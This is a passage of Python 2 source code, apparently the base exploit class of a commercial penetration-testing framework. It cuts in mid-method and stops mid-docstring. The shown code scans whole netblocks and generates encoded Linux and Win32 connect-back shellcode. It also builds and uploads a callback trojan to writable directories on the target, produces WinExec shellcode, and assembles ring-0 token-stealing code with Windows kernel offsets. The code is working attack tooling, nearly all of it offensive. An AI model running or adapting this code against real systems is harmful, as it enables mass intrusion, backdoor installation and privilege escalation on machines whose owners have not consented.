        shellcode2=""
        shellcode2+=chunkbin+self.shellcode[:chunkloc]
        shellcode2+="A"*chunksize
        shellcode2+=self.shellcode[chunkloc:]
        self.shellcode=shellcode2
        if hasbadchar(self.shellcode,self.badstring):
            for a in self.badstring:
                if a in self.shellcode:
                    break
            self.log("Could not encode shellcode. Found %s in string!"%prettyprint(a))
            self.log("Chunker=%s"%prettyprint(chunkbin))
            return 0
        return 1
        
    
    def setPort(self,port):
        self.port=port
        return

    def threaded_run_on_host(self,target,check_for_life=False):
        """
        Starts a new thread that runs run_on_host against our target
        whenever we're ready
        """
        tr=ThreadRunner(target,self)

        tr.check_for_life=check_for_life
        done=0
        while not done:
            if self.state==self.HALT:
                #halted so we don't continue trying
                return
            try:
                tr.start()
                done=1
            except:
                print "Could not start a new thread!"
                #this happens a fair amount on silica
                self.threadwait()
                #error: can't start new thread
                pass 
        return

    def threaded_run_on_host_if_alive(self,target):
        """
        Starts a new thread to scan this host for life
        If alive, this thread will then self.run_on_host(target)
        """
        self.threaded_run_on_host(target,check_for_life=True)
        return
    
    
    def wait_for_threads(self,threads):
        """
        Wait for threads to finish
        """

        def sleepget(obj):
            time.sleep(3)
            devlog("threads", "obj.currentthreads=%d"%obj.currentthreads)
            return obj.currentthreads>0
        
        if not threads:
            return
        start_time=time.time()
        if threads:
            self.log("Found all hosts, waiting until threads are finished")
            time.sleep(10)
            if self.currentthreads:
                self.log("Starting to wait for %d threads to finish"%self.currentthreads)
            while sleepget(self) or sleepget(self) or sleepget(self):
                self.log("Waiting for %d threads to finish. Rouge thread timeout %d"%(self.currentthreads,self.rouge_thread_timeout))
                self.log("Active thread table:")
                self.thread_mutex.acquire()
                for ip in self.thread_table.keys():
                    ##How do we get actual module name from autohack which is under massattack  ??
                    self.log("Target IP: %s  Thread Object: %s"%(ip, self.thread_table[ip] ))
                self.thread_mutex.release()
                if (time.time() - start_time) >= self.rouge_thread_timeout:
                    self.log("Rouge thread timeout of %d hit. Killing all remaining threads with extreme prejudice..."%(self.rouge_thread_timeout))
                    self.kill_rouge_threads()
                    self.log("Rouge threads killed.")
                    break
                time.sleep(60)
            self.log("All threads finished")
        return
    
    def wait_for_threads_new(self):
        """
        Wait for threads to finish
        """

        def sleepget(obj):
            time.sleep(3)
            devlog("threads", "obj.currentthreads=%d"%obj.currentthreads)
            return obj.currentthreads>0
        
        start_time=time.time()
        
        self.log("Found all hosts, waiting until threads are finished")
        time.sleep(10)
        if self.currentthreads:
            self.log("Starting to wait for %d threads to finish"%self.currentthreads)
        while sleepget(self) or sleepget(self) or sleepget(self):
            self.log("Waiting for %d threads to finish. Rouge thread timeout %d"%(self.currentthreads,self.rouge_thread_timeout))
            self.log("Active thread table:")
            self.thread_mutex.acquire()
            for ip in self.thread_table.keys():
                ##How do we get actual module name from autohack which is under massattack  ??
                self.log("Target IP: %s Thread Object: %s"%(ip, self.thread_table[ip] ))
            self.thread_mutex.release()
            if (time.time() - start_time) >= self.rouge_thread_timeout:
                self.log("Rouge thread timeout of %d hit. Killing all remaining threads with extreme prejudice..."%(self.rouge_thread_timeout))
                self.kill_rouge_threads()
                self.log("Rouge threads killed.")
                break
            time.sleep(60)
        self.log("All threads finished")
        return

    def kill_rouge_threads(self):
        
        for t in self.thread_table.values():
            self.log("Killing thread: %s"%(t))
            try:
                t.suicide()
            except SystemExit, err:
                pass
        
        self.currentthreads=0
        self.thread_table={}
        
        
    def set_current_attack_module(self, module):
        """
        Register the name of the module were are currently running against the target
         - ThreadRunner2 will override this method with a threadsafe one
        """
        self.current_attack_module=module
        
    def get_current_attack_module(self, ip=None):
        """
        Retrieve the name of the module were are currently running against the target
         - ThreadRunner2 will override this method with a threadsafe one
        """
        return self.current_attack_module
    
    def C_isOpen(self, host, port, timeout=None, node=None):
        """
        Used by TCP Connectscan's
        Returns:
        "Open" if port is open
        "Closed" if port is closed
        "Host Unreachable" if host is unreachable
        "RST" if remote host sent us a reset
        """
        s=self.gettcpsock(socknode=node)
        if not timeout:
            if hasattr(self, "timeout"):
                timeout=self.timeout
            else:
                #default timeout is two seconds here
                timeout=2
        try:
            s.set_timeout(timeout)
        except:
            pass
        
        
        ret ="Open"
        try:
            fd=s.connect((host, port))
            #devlog("cisopen","fd=%s"%fd)
        except timeoutsocket.Timeout:
            ret="Timeout"
        except socket.error,err:
            if hasattr(err,"__len__") and len(err)>0 and err[0]==113:
                ret="Host Unreachable"
            else:
                ret="Closed"
        except:
            return "RST"
        
        s.close()
        return ret
   
   
    def portopen(self, port):
        """stub function for cleanliness' sake"""
        host=self.target.interface
        return self.C_isOpen(host, port)
        
    def has_named_pipes(self, target, customports=[]):
        "Check for our ability to contact named pipes on that target"
        return self.a_port_open(self.target, [139, 445, 1060] + customports)
            
    def a_port_open(self, target, listofports):
        """
        Looks for one port open among a list of ports. Uses the
        first node with sock capabilities.
        
        Returns true if one is found. False if we were unable to
        run the check or if we did not find an open port.
        """
        #sometimes people pass in a target object instead of a string ip
        if hasattr(target, "interface"):
            target=target.interface
            
        for node in self.argsDict["passednodes"]:
            if "sock" in node.capabilities:
                self.log("Checking for open ports using node %s"%node.getname())
                for port in listofports:

                    ret=self.C_isOpen(target, port, node=node)
                    if ret=="Open":
                        self.log("Port is open")
                        return True 
                self.log("No open ports were found.")
                return False 
        self.log("No node had socket capabilities...failing to find open port and did not check")
        return False 
            
    def run_on_all_alive_hosts(self,threads=False, timeout=None):
        # suspected to leak memory somewhere
        #from sizer import scanner
        #from alx_memprofiler import printinfo
        #objs = scanner.Objects()

        """
        runs one function from the exploit on all possible hosts,
        using self.host and self.netmask
        
        Threads is a boolean here, not a count. We store the count
        in self.maxthreads, which is also copied by hostlistener.link()
        """
        if self.argsDict.get("silica"):
            self.log("Silica Mode")
            # SILICA uses arpscanner not portsweep for speed
            self.exploitnodes("arpscanner") #knowledge should be expanded with this automatically
            return self.run_on_all_known_hosts(threads=threads)

            
        ips=getIPList(self.host+"/"+str(self.netmask))
        node=self.argsDict["passednodes"][0]        
        for host in ips:
            if self.state==self.HALT:
                self.log("Halting on host %s"%host)
                return 0
            if threads:
                """
                Spawn a thread for this host (pausing if necessary)
                """
                if timeout:
                    self.rouge_thread_timeout=timeout
                #little mutex check so we don't go too nutty here
                self.enter()
                self.leave()
                self.log("Starting threaded run on host:%s with thread timeout of:%d "%(host, self.rouge_thread_timeout))
                self.threaded_run_on_host_if_alive(host)
                continue
            self.log("Scanning %s for life"%host)
            #otherwise, we're alive. Let's get a handle to that host...
            target=node.get_known_host(host)
            if not target:
                if not self.checkAlive(host):
                    self.log("Host %s not alive, skipping"%host)
                    continue
                target=node.new_host(host)
            #self.run_on_host must be defined!
            ret=self.run_on_host(target)        ###TODO - FIX THIS FOR MASS ATTACK TWO
            if ret:
                self.log("Returning from run_on_all_alive_hosts from success on host %s"%host)
                return ret
        
        #printinfo(objs, 10) # prints out top 10 memory consuming objects (0 prints all)
        self.wait_for_threads(threads)
        return 0
    
    def run_threaded_on_alive_hosts(self, e_module, targets=None):
        """
        Tiny wrappper to ensure life checks are done on targets
        """
        if self.argsDict.get("silica"):
            self.log("Silica Mode")
            # SILICA uses arpscanner not portsweep for speed
            self.exploitnodes("arpscanner") #knowledge should be expanded with this automatically
            return self.run_on_all_known_hosts(threads=threads)
        
        self.run_threaded_scan(e_module, targets, life_check=True)
        
    def run_threaded_scan(self, e_module, targets=None, life_check=False):
        """
        Run a scan over a range of targets with specified exploit module
        """
        
        if not targets:
            targets=getIPList(self.host+"/"+str(self.netmask))
        
        tr2=ThreadRunner2.ThreadRunner2(self, targets, e_module, life_check)
        tr2.start() # start thread from bugtracker exception handler
        
        ##This should call back into the exploit module that called this scan to process results appropriately
        self.process_thread_results(tr2.result_q, tr2.end_of_results_marker)
        
    def process_thread_results(self, status_q, end_of_run_marker):
        """
        This is the ThreadRunner2 magic right here. Essentially ALL threads return state about
        what they are up to via a q to the ThreadTracker, The TrheadTracker then does some
        sanitization and spits stuff back down a results q to us.
        
        This means that we can sit in a loop and read from the same q for all the targets in
        our range and do stuff like reporting based on what we see coming back.
        
        Data comes back in the form of:
             [Thread Object to which this status relate] , [status marker] ,[data]
        
        *REMEBER* this is one queue for ALL threads, not one for each!
        """
        print "This should be overloaded by the calling module, not for use in production code"
        while 1:
            tr2_obj, status, data=status_q.get()
            
            if status == end_of_run_marker:
                ##ALL threads have completed so now more status/results to process
                tr2_obj.join()
                break
            #self.log("Child thread result: [%s] = %s"%(ip, data))
            print "Status data returned: %s",data
        
        self.log("All results gathered")
        
    
    def checkAlive(self,host):
        self.log("In CheckAlive")
        if self.force:
            return 1

        #you can't do port 25 because norton will return true for you. It's lame, but true.
        portslist=[80, 135, 445, 443, 21, 22, 64432]
        #add our port if !=0
        if self.port: 
            portslist+=[self.port]
            
        for each in portslist:
            self.log("Checking %d for life"%(each))
            try:
                #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s=self.gettcpsock()
                s.set_timeout(1.0)
                s.connect((host,each))
                self.log("Connected to port %d - Alive"%each)
                return 1
            except socket.error,message:
                #import traceback
                #traceback.print_exc(file=sys.stderr)
                if message[0]==113:
                    #no route to host
                    self.log("No route to host %s"%host)
                    return 0
                if message[0] in [111,10061]:
                    #10061 is nt, 111 is unix
                    self.log("Host %s alive (connection refused on port %d)"%(host,each))
                    return 1 #port closed, host alive
                #otherwise we have no idea what the exception was
            except timeoutsocket.Timeout:
                #import traceback
                #traceback.print_exc(file=sys.stderr)
                self.log("Host %s timed out on port %d"%(host, each))
                #return 0
        #self.log("Firewalled?")
        return 0 #firewalled?

    def run_on_all_possible_hosts(self,threads=False):
        """
        This function will call a self.run_on_hosts(target) for every target within our host/netmask.
        
        It does not care if they are known or alive or not.
        """
        ips=getIPList(self.host+"/"+str(self.netmask))
        node=self.argsDict["passednodes"][0]        
        totalips=len(ips)
        i=0
        
        sil = self.argsDict.get("silica", False)
        sgp = self.argsDict.get("sgp", False)
            
        for host in ips:
            if self.state==self.HALT:
                self.log("Halting on host %s"%host)
                return 0
            
            
            self.log("Scanning %s"%host)

            #Set the progress as we go through - we're not threaded
            #so essentially this is a sequential loop
            #even if we are threaded, it's good to show how close to done we are
            self.setProgress((float(i)/float(totalips)) * 100.0)

            # This is also needed for every thread for the n810
            if sil and (sgp.driver == "ipwraw"):
                time.sleep(0.4)
                
            i+=1
            # The n810 has a bad scheduler so it results into crashes, introduce an artificial delay
            # to help it cope with our load
            if (not (i%5)) and sil and (sgp.driver == "ipwraw"):
                time.sleep(1.2)
            
            if threads:
                """
                Spawn a thread for this host (pausing if necessary)
                """
                #little mutex check so we don't go too nutty here
                self.enter()
                self.leave()
                self.threaded_run_on_host(host)
                continue


            target=node.get_known_host(host)
            if not target:
                target=node.new_host(host,add=0) #don't add the host by default
            #self.run_on_host must be defined!
            ret=self.run_on_host(target)
            if ret:
                return ret

        self.wait_for_threads(threads)
        return 0
 
    def createLinuxCallbackShellcode(self, localhost, localport, badchars):
        """
        Get standard linux callback shellcode
        """
        self.shellcode=linuxshell.getcallbackcode(localhost,localport)
        self.shellcode=self.intel_encode(badchars, self.shellcode)
        if not self.shellcode:
            self.log("Encoding shellcode failed!") #serious error!
        return self.shellcode
    

    
        
    def run_on_all_known_hosts(self,threads=False):
        """ 
        This runs self.run_on_host() on all known hosts - within our targeted
        netrange.
        """
        
        ips=getIPList(self.host+"/"+str(self.netmask))
        node=self.argsDict["passednodes"][0]        
        
        for host in ips:
            if self.state==self.HALT:
                self.log("Halting on host %s"%host)
                return 0
            
            #otherwise, we're alive. Let's get a handle to that host...
            target=node.get_known_host(host)
            
            if not target:
                continue

            self.log("Scanning known host: %s"%host)
            if threads:
                """
                Spawn a thread for this host (pausing if necessary)
                """
                #little mutex check so we don't go too nutty here
                self.enter()
                self.leave()
                self.threaded_run_on_host(host)
                continue

            #self.run_on_host must be defined!
            ret=self.run_on_host(target)
            #don't forget, we only get here if we are not threaded.
            if ret:
                return ret

        #if we are threaded, we end up here
        self.wait_for_threads(threads)
        return 0
    
    def run_on_list_of_hosts(self, hostlist, threads=False):
        i=0
        for host in hostlist:
            if self.state==self.HALT:
                self.log("Halting on host %s"%host)
                return 0
            
            #Let's get a handle to that host...
            #first we add it - we don't check to see if it really exists here...we assume you already did that.
            target=self.argsDict["passednodes"][0].add_host(host)
            
            if not target:
                continue

            self.log("Scanning host: %s"%host)

            #handle progress bar
            self.setProgress((float(i)/len(hostlist)) * 100.0)
            i+=1

            if threads:
                """
                Spawn a thread for this host (pausing if necessary)
                """
                #little mutex check so we don't go too nutty here
                self.enter()
                self.leave()
                self.threaded_run_on_host(host)
                continue

            #self.run_on_host must be defined!
            ret=self.run_on_host(target)
            #don't forget, we only get here if we are not threaded.
            if ret:
                return ret

        #if we are threaded, we end up here
        self.wait_for_threads(threads)
        return 0
        
    
    def createKnownWin32Shellcode(self,known,host,port,subesp=0):
        """
        Creates a very small shellcode that is SP+Lang dependant
        
        check the top of win32knownshellcodegenerator for valid values of known
        """
        from shellcode.win32knownshellcodegenerator import win32Known
        myobj=win32Known()
        myobj.badstring=self.badstring
        myobj.knownSP(known)
        myobj.addAttr("findeipnoesp",{"subespval": subesp}) #don't mess with eip
        myobj.addAttr("smalltcpconnect",{"port": port,"ipaddress": host})
        myobj.addAttr("smallrecv",None)
        myobj.addAttr("NoExit",None)
        #self.addAttr("initstackswap",None)
        #self.addAttr("stackSwap",None)
        ret=myobj.get()    
    
        encoder= addencoder.inteladdencoder()
        encoder.setbadstring(self.badstring)
        encodedshellcode=encoder.encode(ret)
        self.shellcode=encodedshellcode
        return
    
    def mini_search_code(self, tagbyte, start_register):
        """
        x86 only
        does not correct for bad bytes!
        Finds our shellcode offset from a register and jmps there
        """
        ret=""
        #loop for TAGBYTE twice in a row, to avoid false positives on our own shellcode
        code="""
        searchloop:
            inc %REGISTER
            cmpb $TAGBYTE, (%REGISTER)
            jne searchloop
            inc %REGISTER
            cmpb $TAGBYTE, (%REGISTER)
            jne searchloop
        inc %REGISTER   
        jmp %REGISTER
        """
        code=code.replace("REGISTER", start_register)
        code=code.replace("TAGBYTE", "%d"%(ord(tagbyte)))
        ret=mosdef.assemble(code, "X86")
        bad=intersection(self.badstring, ret)
        if bad:
            raise Exception, "Bad chars in mini_search_code: %s"%prettyhexprint(bad)
        return ret 
    
    def uploadmosdeftrojan(self, target_os=None, uploaddirs=None, filename=None, node=None):
        """
        Builds and uploads a MOSDEF trojan to the target!
        Return False or the name of the file we uploaded ( so you can spawn it )
        """
            
        if not node:
            node=self.argsDict["passednodes"][0]
        #First we need to create our payload
        if type(target_os)==type(""):
            target_os=canvasos(target_os) #windows base for trojan building
        else:
            if not target_os:
                target_os=self.target_os
        #now target_os is finally set up properly :>
        
        #generate a filename if we are not passed one
        if not filename:
            if target_os.isUnix():
                filename = ".%d" % random.randint(1,65535)
            else:
                filename="msvc%d.exe"%randint(0,5000)

        if self.callback.port==0:
            self.log("Failed to set callback port (is there a -d option?)")
            return 0
        
        #build the trojan
        self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os)
        #self.mosdeftrojan is now built
        if not self.mosdeftrojan:
            self.log("Could not build remote trojan! :<")
            return 0
        
        #now upload the trojan
        if not uploaddirs:
            from ExploitTypes.CommandLineExecuter import win32WritableDirs, linuxWritableDirs, solWritableDirs
            bases={"Windows": win32WritableDirs, "Linux":linuxWritableDirs, "Solaris":solWritableDirs}
            
            uploaddirs=bases[target_os.base][:]
        
        #we assume if we have permission to read it, we have permission to 
        #execute it...
        for directory in uploaddirs:
            fname=directory+filename
            # Not all nodes have an upload_data that'll take plain data in a string, instead of a source file.
            
            if hasattr(node.shell, "upload_data"):
                ret = node.shell.upload_data(self.mosdeftrojan, fname)
            else:
                TFN = "trojan.bin.tmp"
                fo = open(TFN, "wb")
                fo.write(self.mosdeftrojan)
                fo.close()
                try:
                    self.log("Trying upload to %s" % fname)
                    ret=node.upload(TFN, dest=directory, destfilename=filename)
                except NodeCommandError, i:
                    self.log("Upload failed: %s" % i)
                os.unlink(TFN)
                
            if ret:
                self.log("uploaded trojan to %s"%fname)
                break
            else:
                self.log("Failed to upload file to %s" % fname)
        
        if ret:
            if target_os.isUnix():
                self.log("Target OS is a unix, setting the file mode +x")
                ret = node.runcommand("chmod a+x %s" % fname)
                # Error reporting from runcommand is pretty patchy :(
            return fname
        else:
            self.log("All attempts at uploading failed")
            return False
        
        
        
                
            

    def buildmosdeftrojan(self, ipaddr, port, target_os=None, http=False, ssl=False):
        """
        Uses MOSDEF to build a trojan based on self.target_os.base_os
        """
        from MOSDEF import makeexe
        from MOSDEF.cc import threadsafe_cc_main
        import socket 
        
        if target_os==None:
            target_os=self.target_os
            
        if target_os.isUnix() and not target_os.cygwin:
            self.log("Compiling Unix trojan")
            #TODO, account for CANVAS ROOT
            infilename="backdoors/cback_mmap_rwx.c"
            #we initialize our compiler with an empty define set
            vars = {}
            #-D CBACK_PORT=port, etc
            vars['CBACK_PORT'] = port
            vars['CBACK_ADDR'] = str2int32(socket.inet_aton(ipaddr))
            self.log("Callback address is %x"%vars['CBACK_ADDR'])
            cc_command=[]

            # handle OS compile semantics here ..

            if 'LINUX' in target_os.base.upper():
                cc_command += ['-k', '2.6'] # assume 2.6 for Linux ..
            else:
                cc_command += ['-k', 'None'] # might fail .. no kernel version set

            # solaris intel needs a syscalltype send before the fd send emulation
            if 'SOLARIS' in target_os.base.upper() and 'X86' in target_os.arch.upper():
                cc_command += ['-D', '__SOLARIS_INTEL__']

            for var in vars:
                cc_command += ["-D", "%s=%s" % (var,vars[var])]

            # AFAIK this is the only place where we do these commandline calls to cc
            # so instead of mangling the remoteresolver code .. handle versioning semantics _here_

            cc_command += ["-v","-m",target_os.base,"-p",target_os.arch, "-k", "None", infilename]

            self.log("CC command: %s"%cc_command)
            self.mosdeftrojan=threadsafe_cc_main(cc_command)
            if not self.mosdeftrojan:
                self.log("Was unable to create trojan!")
                return False 
            self.log("Length of CC compiled trojan: %s"%len(self.mosdeftrojan))

        elif target_os.base.upper() in ['WINDOWS']:

            sc = shellcodeGenerator.win32()

            if http == False:
                sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
                sc.addAttr("revert_to_self_before_importing_ws2_32", None)
                sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : ipaddr})
                sc.addAttr("loadFDasreg", {"reg" : "esi"})
                sc.addAttr("RecvExecDepSafe",None) #MOSDEF
                sc.addAttr("ExitThread",None)
            else:
                sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
                sc.addAttr("revert_to_self_before_importing_ws2_32", None)
                SSL = { True : 's', False : '' }
                sc.addAttr("httpGetShellcode", {'URL': "http%s://%s:%d"%(SSL[ssl], ipaddr, port)})                

            shellcode = sc.get()
            
            myPElib=pelib.PElib()
            self.mosdeftrojan=myPElib.createPEFileBuf(shellcode, gui=True)
            if self.mosdeftrojan==None:
                self.log("Some sort of error compiling our PE")
                return False 

            self.log("Win32 MOSDEF Trojan compiled to %d bytes"%len(self.mosdeftrojan))
        else:            
            self.log("Could not create trojan for %s"%str(target_os))
            return False 
        return True 

    def intel_encode(self, badstring, rawshellcode, subesp=0, minimumchunklength=80):
        """
        Encodes the shellcode with the badstring
        tries xor and additive and chunked additive encoder
        """
        if len(rawshellcode)==0:
            self.log("Your shellcode is of length zero. This is most likely a bug in your exploit!")
            return ""
        
        self.log("Intel Encoding raw shellcode of length %d"%len(rawshellcode))
        if len(badstring) == 0:
            self.log("Encoding not needed")
            return rawshellcode
        #here we check to see if we are LIKELY to find a
        #good XOR encoder - otherwise we will waste a lot
        #of time doing nothing useful
        if (len(badstring)*len(rawshellcode))<3000:
            self.log("Trying xor encoder")
            enc=xorencoder.simpleXOR()
            enc.subesp=subesp
            enc.setbadstring(badstring)
            ret=enc.find_key(rawshellcode)
            if ret==0:
                self.log("Could not generate XOR key for this shellcode!")
            else:
                encodedshellcode=enc.encode(rawshellcode)
                if encodedshellcode:
                    return encodedshellcode
        if (len(badstring)*len(rawshellcode))<5000:
            self.log("Trying additive encoder")
            #Then try intel additive encoder
            encoder=addencoder.inteladdencoder()
            encoder.maxguesses=5000
            encoder.setbadstring(badstring)
            encodedshellcode=encoder.encode(rawshellcode)
            
            if encodedshellcode:
                self.log("Used additive encoder")
                return encodedshellcode
        
        #otherwise we always try chunked encoder
        self.log("Using chunked encoder (minimum chunk of %d)"%minimumchunklength)
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        if len(badstring)>5:
            #130 is very slow, 80 is quite fast
            #but 80 will generate very large shellcode!
            encoder.minimumchunklength=minimumchunklength
        encoder.setbadstring(badstring)
        shellcode = encoder.encode(rawshellcode)
        if shellcode: 
            self.log("Used chunked additive encoder")
            return shellcode
        self.log("Chunked additive encoder failed")
        return None

    def createSmallWin32Shellcode(self,host,port,subesp=0, badstring=None):
        self.log("createSmallWin32Shellcode: %s:%s subesp: %d"%(host,port,subesp))
        sc=shellcodeGenerator.win32()
        sc.addAttr("tcpconnect",{"port":port,"ipaddress":host})
        sc.addAttr("SmallRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("UseWS2Ordinal",None)
        rawshellcode=sc.get()
        self.log("Length of raw shellcode=%d"%len(rawshellcode))
        if badstring==None:
            badstring=self.badstring
        if not badstring:
            self.shellcode=rawshellcode
            return rawshellcode

        self.shellcode=self.intel_encode(badstring, rawshellcode)
        if not self.shellcode:
            self.log("Warning: No shellcode generated - too many bad characters?!")
        
        return self.shellcode
    
    def getfirstnode(self):
        return self.argsDict["passednodes"][0]
    
    def osdetect(self):
        "we do this so often, it needs a function"
        osd=self.engine.getModuleExploit("osdetect")
        osd.link(self)
        osd.run()
        return osd.result

    def exploitnodes(self,modulename,nodes=None,args=None,target=None):
        """Run one module over all our nodes and return a list of results
        args is a dictionary of arguments, when used
        """
        sploit=self.engine.getModuleExploit(modulename)
        sploit.link(self)
        if target:
            sploit.target=target
        if args:
            for arg in args:
                sploit.argsDict[arg]=args[arg]
                
        results=[]
        if nodes:
            allnodes=nodes
        else:
            allnodes=self.argsDict["passednodes"]
        for node in allnodes:
            sploit.argsDict["passednodes"]=[node]
            ret=sploit.run()
            result=sploit.result
            results.append(result)
        return results
            
    def createTestShellcode(self,start=0x00,end=0x100,reverse=False):
        """
        Creates a short shellcode with no known bad chars in it
        When reverse is true then we do it backwards - useful
        for testing if iscntrl is the filter.
        """
        self.log("Creating test shellcode: %s:%s %s"%(start,end,reverse))
        self.log("Badstring: %s"%prettyhexprint(self.badstring))
        
        ret=""
        if not reverse:
            for i in range(start,end):
                if chr(i) not in self.badstring:
                    ret+="A"+chr(i)+"%2.2x"%i
        else:
            #reverse
            if end==256:
                end=255
            for i in range(end,start,-1):
                if chr(i) not in self.badstring:
                    ret+="A"+chr(i)+"%2.2x"%i                   
        self.shellcode=ret
        return ret

    def encodeshellcode(self,rawshellcode,platform="X86"):
        if platform=="X86":
            encoder=chunkedaddencoder.intelchunkedaddencoder()
        else:
            self.log("encodeshellcode: Unknown platform %s"%platform)
            return 
        #these are the characters not allowed by the exploit
        encoder.setbadstring(self.badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        #debug int
        #shellcode="\xcc"+shellcode        
        self.shellcode=shellcode
        return self.shellcode

    def createWin32WinExecShellcode(self,command,reverttoself=0):
        """
        Creates a shellcode that executes one command
        Note that this shellcode does not wrap it in a cmd /c
        so if you want to execute multiple commands, you'll have
        to do that manually (command="cmd /c blah")
        
        Setting the revertoself argument will make bigger shellcode,
        but it will also let winexec work in cases where you came
        in over MSRPC and your token is now anonymous. The anonymous
        token can't load DLL's, which may result in some issues for you.
        
        Final shellcode will probably result in around 350 bytes,
        which is nice and small, but obviously you'll need to add to that
        the length of your command.
        
        Examples:
        self.createWin32WinExecShellcode("\\\\myhost\\mytrojan.exe")
        
        """
        if not command:
            self.log("Cannot create null winexec shellcode")
            return
        sc = shellcodeGenerator.win32()
        #sc.addAttr("ForkLoad", None)
        # the to fork code
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        if reverttoself:
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("winexec", {"command" : command })
        rawshellcode = sc.get()
        if self.badstring=="":
            #no bad characters? Great!
            self.shellcode=rawshellcode
            return 1
        self.log("Raw shellcode (before encoding) is %d bytes"%len(rawshellcode))
        #set up the shellcode
        #For testing purposes! (following line) Comment out for real use
        #rawshellcode=(badchartest(0,255,self.badstring)*50)[:len(rawshellcode)]
        self.log("Last raw characters: %s"%prettyhexprint(rawshellcode[-16:]))
        self.encodeshellcode(rawshellcode)
        self.log("Encoded shellcode length: %d"%len(self.shellcode))
        self.log("Last encoded characters: %s"%prettyhexprint(self.shellcode[-16:]))
        return 1
    
    def createWin32ThreadCallbackShellcode(self):
        """
        Creates a Win32 Shellcode that starts a new thread.
        Exploits that use this need:
        self.listenerArgsDict["fromcreatethread"]=1
        in their __init__ for the GUI to set this properly, and
        will need a -i fromcreatethread when using
        the commandline
        """
        if self.callback==None:
            self.log("Cannot create callback shellcode without a callback...")
            return 
        host=self.callback.ip
        port=self.callback.port
        self.log("Creating shellcode to callback to %s:%s"%(host,port))
        sc = shellcodeGenerator.win32()
        #sc.addAttr("ForkLoad", None)
        # the to fork code
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread",None)
        rawshellcode = sc.get()
        if self.badstring=="":
            #no bad characters? Great!
            self.shellcode=rawshellcode
            return 1
        self.log("Raw shellcode (before encoding) is %d bytes"%len(rawshellcode))
        #set up the shellcode
        #For testing purposes! (following line) Comment out for real use
        #rawshellcode=(badchartest(0,255,self.badstring)*50)[:len(rawshellcode)]
        #self.log("Last raw characters: %s"%prettyhexprint(rawshellcode[-16:]))
        self.shellcode=self.intel_encode(self.badstring, rawshellcode)
        self.log("Encoded shellcode length: %d"%len(self.shellcode))
        #self.log("Last encoded characters: %s"%prettyhexprint(self.shellcode[-16:]))
        #you'll need this in __init__ as well. here for reference
        self.log("If you're using the commandlineInterface.py then you'll need -i fromcreatethread")
        self.listenerArgsDict["fromcreatethread"]=1
        return 1
    
    def createRing0TokenShellcode(self,pid=-1,retadd=0,osmajor=-1,osminor=-1):
        """Replace the Token of a Process by the one of the System process
           If _pid_ is -1, then the 'current' process Token will be replaced,
           otherwise, the one of the process with the given _pid_ will be.
           _retadd_ adjusts the stack for the 'ret' instruction, it depends
           from where your shellcode is called
           
           """

        ring0shellcode="""   
    xorl %eax,%eax
    movl %fs:0x124(%eax),%eax
    movl 0xProcessOffset(%eax),%eax
    movl %eax,%ecx
find_system_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xSystemProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_system_process
    movl 0xTokenOffset(%eax),%edx //Token of System process
    movl %ecx,%eax
"""
        if pid!=-1:
            ring0shellcode+="""find_our_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xOurProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_our_process
"""
        ring0shellcode+='    movl %edx,0xTokenOffset(%eax) //Replace the Token of our process\n'
        ring0shellcode+="""popl %edx
        popl %ecx
        movl $0x00000001, %eax
        movl %ebp, %esp
        pop  %ebp
        """
        if retadd==0:
            ring0shellcode+='    ret\n'
        else:
            ring0shellcode+='    ret $0x%x\n'%(retadd)
        self.log('Creating RING0 Token stealing shellcode for ProcessId %d'%(pid))
        
        if osmajor==6:
            self.log('Windows Vista/2008 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x48 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0xa0 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x9c #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xe0 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==2:
            self.log('Windows Server 2003(R2) SP2 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x38 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x98 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x94 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xd8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==1:
            self.log('Windows XP RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        else:
            self.log('Invalid OS version')
            return 0

        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        
        self.shellcode=mosdef.assemble(ring0shellcode,'x86')
        
        return 1
    
    def pidfromname(self,name,node):
        """
        Uses PS to get a pid from a name on a certain node
        returns -1 on failure
        
